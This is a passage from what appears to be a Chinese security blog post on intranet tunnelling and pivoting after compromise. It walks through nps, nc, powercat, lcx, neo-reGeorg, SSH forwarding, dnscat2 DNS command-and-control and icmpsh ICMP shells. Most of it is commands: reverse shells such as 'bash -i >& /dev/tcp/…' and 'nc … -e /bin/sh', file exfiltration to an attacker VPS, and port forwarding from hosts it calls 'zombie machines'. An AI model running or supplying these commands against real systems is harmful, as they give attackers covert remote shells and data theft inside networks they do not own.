+<p><img src="images/image-20210904145523028.png" alt="image-20210904145523028"></p>
+<h5 id="新增客户端">新增客户端</h5>
+<p><img src="images/image-20210904145535674.png" alt="image-20210904145535674"></p>
+<p>设置客户端验证秘钥：</p>
+<p><img src="images/image-20210904145601248.png" alt="image-20210904145601248"></p>
+<p><img src="images/image-20210904145643688.png" alt="image-20210904145643688"></p>
+<h5 id="配置客户端">配置客户端</h5>
+<p>上传客户端文件至C，解压后在CMD运行命令：</p>
+<pre><code>npc.exe -server=10.108.3.147:8024 -vkey=123456 -type=tcp
+</code></pre>
+<p><img src="images/image-20210904145706521.png" alt="image-20210904145706521"></p>
+<p>在web管理页面可以看到C主机已上线：</p>
+<p><img src="images/image-20210904145721960.png" alt="image-20210904145721960"></p>
+<h5 id="配置socks5代理">配置Socks5代理</h5>
+<p>现在A仍然无法访问内网的C主机，需要使用Socks5客户端软件把流量带出来。</p>
+<p>注意：一定要等客户端上线以后在配置Socks代理。</p>
+<p><img src="images/image-20210904145811118.png" alt="image-20210904145811118"></p>
+<p><img src="images/image-20210904145838461.png" alt="image-20210904145838461"></p>
+<p>新增成功后的页面：</p>
+<p><img src="images/image-20210904145847358.png" alt="image-20210904145847358"></p>
+<h5 id="测试">测试</h5>
+<p>配置Proxifier</p>
+<p><img src="images/image-20210904150144696.png" alt="image-20210904150144696"></p>
+<p>测试成功</p>
+<p><img src="images/image-20210904150124741.png" alt="image-20210904150124741"></p>
+<p>官方文档：https://ehang-io.github.io/nps/#/?id=nps</p>
+<h2 id="二传输层">二、传输层</h2>
+<h3 id="21-nc">2.1. nc</h3>
+<p>nc 是一款比较老的工具，但是确实是经典俗称瑞士军刀，简单介绍一下</p>
+<p>简单互相传输功能：</p>
+<pre><code>vps：nc -lp 5555 
+
+目标机器：Nc -vn vpsip 5555
+</code></pre>
+<p>文件传输功能：</p>
+<pre><code>vps：nc -lp 5555 &gt;1.txt
+
+目标机器：Nc -vn vpsip &lt; xx.txt
+</code></pre>
+<p>shell的反弹：</p>
+<pre><code>正向连接：
+nc -lvp 4444 -e /bin/sh
+nc  192.168.1.1 4444
+
+
+反向连接：
+nc -lvp 4444
+nc 192.168.1.1 4444 -e /bin/sh
+</code></pre>
+<p>注意：windows版本CMD位置C:\windows\system32\cmd.exe</p>
+<p>Bash反向shell</p>
+<pre><code>nc -lvp 4444
+
+Bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1
+</code></pre>
+<h3 id="22-powercatpowershell版的nc">2.2 Powercat（powershell版的nc）</h3>
+<pre><code>正向和反向连接：
+
+powercat -l -p 8080 -e cmd.exe  -v   
+nc 192.168.1.1 8080 -vv
+
+nc -l -p 8080 -vv
+powercat -c 192.169.1.1 -p 8080 -e cmd.exe -v
+</code></pre>
+<p>可以反弹powershell</p>
+<pre><code>-eq 
+</code></pre>
+<p><strong>文件上传</strong></p>
+<p>这个不用说，基本这种连接的都支持</p>
+<p>在<code>c:</code>下新建一个<code>test.txt</code>的文件，写入数据</p>
+<p>在有<code>text.txt</code>的机器执行:</p>
+<pre><code>powercat -c 192.168.12.108 -p 9999 -i c:test.txt -v
+</code></pre>
+<p>另一台机器执行</p>
+<pre><code>powercat -l -p 9999 -of c:test.txt -v
+</code></pre>
+<h3 id="3lcx端口转发">3.lcx端口转发</h3>
+<pre><code>windows
+vps: lcx -listen 2222 3333    //2222为转发端口，3333为本机任意未被占用的端口
+肉鸡：lcx -slave vps_ip 2222 127.0.0.1 3389  //将本地3389端口转发至vps_ip 2222端口
+3389连接时格式   vps:3333
+
+
+linux
+vps：./portmap -m 2 -p1 6666 -h2 公网IP -p2 7777
+
+肉鸡：./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网ip -p2 6666
+将内网主机22端口的流量转发到公网主机的6666端口
+</code></pre>
+<h3 id="5neo-regeorg">5.neo-reGeorg</h3>
+<p>VPS上支持生成的服务端，默认 GET 请求响应指定的页面内容 (如伪装的404页面)</p>
+<pre><code>python neoreg.py generate -k &lt;you_password&gt; --file 404.html
+</code></pre>
+<p>将相应的隧道文件放到目标服务器的web目录后使用neoreg连接web服务器并建立本地socks代理。</p>
+<p>VPS上运行</p>
+<pre><code>python neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --proxy socks5://10.1.1.1:8080（本地代理地址）
+</code></pre>
+<p>Socks连接工具连接本地127.0.0.1:1080</p>
+<h2 id="三应用层">三、应用层</h2>
+<h3 id="31-ssh转发">3.1 SSH转发</h3>
+<p>一个正常的SSH命令</p>
+<pre><code> ssh root@192.168.1.1
+</code></pre>
+<h4 id="ssh-本地转发机制">SSH 本地转发机制</h4>
+<p>拓扑：VPS&mdash;-边界WEB&mdash;-目标主机</p>
+<p>边界WEB双网卡192.168.1.1和10.1.1.1段</p>
+<p>本地转发机制：</p>
+<p>选项：</p>
+<pre><code>-C 压缩传输
+-f 后台启用
+-N 不打开远程shell，处于等待状态
+-g 允许本地转发端口
+</code></pre>
+<p>使用方法：</p>
+<p><strong>在VPS上运行</strong></p>
+<pre><code>用法：ssh -CfNg -L &lt;vps port&gt;:&lt;目标主机 host&gt;:&lt;目标主机 port&gt; &lt;SSH 边界机&gt;
+
+ssh  -CfNg -l 5555:10.1.1.1:3389 root@192.168.1.1
+
+#VPS检查---查看端口是否已经连接
+netstat -tulnp | grep &quot;5555&quot;
+</code></pre>
+<p>当访问 VPS 5555 端口的时候，就转发给 <a href="mailto:root@192.168.1.1">root@192.168.1.1</a> 边界机 ，发送给目标主机</p>
+<h4 id="ssh-远程转发机制">SSH 远程转发机制</h4>
+<p>拓扑：VPS&mdash;-边界WEB&mdash;-目标主机</p>
+<p>边界WEB&mdash;-目标主机&mdash;都是单网卡，都是纯内网 10.1.1.1段</p>
+<p><strong>在WEB边界机运行</strong></p>
+<pre><code>ssh -CfNg -R &lt;vps port&gt;:&lt;目标主机 host&gt;:&lt;目标主机 port&gt; &lt;SSH VPS主机&gt;
+
+ssh  -CfNg -l 6666:10.1.1.1:3389 root@49.121.1.102
+</code></pre>
+<p>边界机把内网的端口，远程连接道VPS，远程转发道VPS</p>
+<h4 id="ssh-动态转发机制">SSH 动态转发机制</h4>
+<p>这里主要是建立一个动态的socks代理隧道</p>
+<p>在VPS上运行</p>
+<pre><code>ssh -CfNg -D 7000 &lt;SSH 边界主机&gt;
+ssh -CfNg -D 7000 root@192.168.1.1
+</code></pre>
+<p>VPS上7000端口上，开了一个socks代理，用代理软件就可以连接</p>
+<h3 id="32-dns-隧道">3.2 DNS 隧道：</h3>
+<p>dnscat2</p>
+<p>工具dnscat2，这是一DNS隧道，该工具旨在通过DNS协议创建加密的命令和控制（C＆C）通道，还有自己的控制台</p>
+<p>dnscat2分为两个部分：客户端和服务器。</p>
+<p>服务端为<code>Ruby</code>编写，需安装Ruby环境。kali系统内置Ruby，但是运行时仍可能报缺少一些gem依赖：</p>
+<p>服务端VPS：</p>
+<pre><code>安装依赖：
+apt install gem
+apt install ruby-dev
+apt install libpq-dev
+apt install ruby-bundler
+
+下载并安装：
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server
+sudo gem install bundler
+
+开启服务：
+ruby ./dnscat2.rb vpn.zeo.com -e open
+</code></pre>
+<p>目标主机客户端：</p>
+<p>上传dnsClient.zip 到目标主机 解压</p>
+<pre><code>./dnscat --dns server=服务端ip,port=53 --secret=服务端生成的秘钥
+</code></pre>
+<p>直连模式使用方法：</p>
+<pre><code>VPS中 server路径下：
+ruby ./dnscat2
+
+客户端：（这个命令会在 上面服务启动后提示，可以参考下面的截图红框）
+./dnscat --dns server=x.x.x.x,port=53 --secret=281fc7a7ec57d500d269c96b8ae36ba5
+</code></pre>
+<h2 id="四网络层">四、网络层</h2>
+<h3 id="41-icmp隧道">4.1 ICMP隧道</h3>
+<p>ICMP（Internet Control Message Protocol）：没有目的端口与源端口，属于Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。</p>
+<p>icmp隧道常用攻击：icmpsh、PRISM</p>
+<p>icmpsh
+环境说明:跨平台、不需要管理员运行</p>
+<p>有三台机器： VPS&ndash;边界机&ndash;内网机</p>
+<p>VPS操作过程：</p>
+<p>下载icmpsh</p>
+<p>安装依赖</p>
+<pre><code>服务端禁用：
+icmp respones  sysctl -w net.ipv4.icmp_echo_ignore_all=1
+
+运行程序 ：
+./run.sh
+
+输入目标主机IP地址 开启监听：
+./icmpsh_m,py  vpsip 边界出网的公网IP
+
+
+在边界机执行：
+Imp.exe -t 攻击机ip -d 500 -b 30 -s 128
+</code></pre>
+<p>还有一种方法</p>
+<pre><code>编译 gcc icmpsh-m.c
+
+VPS开启监听： sudo ./a.out
+内网边界主机：icmpsh.exe -t VPSip -d 500 -b 30 -s 128
+</code></pre>
+<h3 id="42-lcx">4.2 Lcx</h3>
+<p>内网端口转发</p>
+<pre><code>目标主机：lcx.exe -slave vpsip 4444 127.0.0.1 3389
+
+VPS:Lcx --listen 4444 5555
+</code></pre>
+
+    </div>
+    <div class="article-footer">
+<blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接: </strong>
+      <a href="https://ad-calcium.github.io/2021/09/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" title="内网穿透工具的使用" target="_blank" rel="external">https://ad-calcium.github.io/2021/09/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>License: </strong>
+        <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a>
+    </li>
+  </ul>
+</blockquote>
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/ad-calcium" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="https://ad-calcium.github.io/avatar.png" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/ad-calcium" target="_blank"><span class="text-dark">AD钙奶</span><small class="ml-1x"></small></a></h3>
+        <div>Good Good Study, Day Day Up~</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+    </div>
+  </article>
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://ad-calcium.github.io/2021/09/cve-2021-26084confluence-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2021-26084(Confluence) 漏洞复现"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;下一篇</span></a>
+            </li>
+            <li class="next">
+                <a href="https://ad-calcium.github.io/2021/09/impacket%E5%A5%97%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/"
+                    title="IMPACKET套件使用"><span>上一篇&nbsp;&nbsp;</span><i
+                        class="icon icon-angle-right" aria-hidden="true"></i></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="文章目录" role="button">
+                    <span>[&nbsp;</span><span>文章目录</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter"
+                data-mobile-sites="weibo,qq,qzone"></div>
+        </div>
+    </div>
+</nav>
+
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+  <div class="copyright">
+    &copy;2020  -
+    2021
+
+    
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://ad-calcium.github.io/js/application.min.a94ab19cb63a95c8d7fbd7b85cab3ddeea8c369bdf75b9cab6708787ead123af.js"></script>
+<script src="https://ad-calcium.github.io/js/plugin.min.19c5bcb2fb0789ab4f2b7834e5ceb5e92635645605bab902c1024b25f1502364.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(未命名)',
+            },
+            ROOT_URL: 'https:\/\/ad-calcium.github.io\/',
+            CONTENT_URL: 'https:\/\/ad-calcium.github.io\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://ad-calcium.github.io/js/insight.min.4a2d52de4bfff73e0c688404fe3d17c9a3ae12d9888e1e1ac9c690e4890de2ded50fe55f2b819c2ba55435a76f396f3ea6805765f0b0af5635cdf74ea459eab0.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
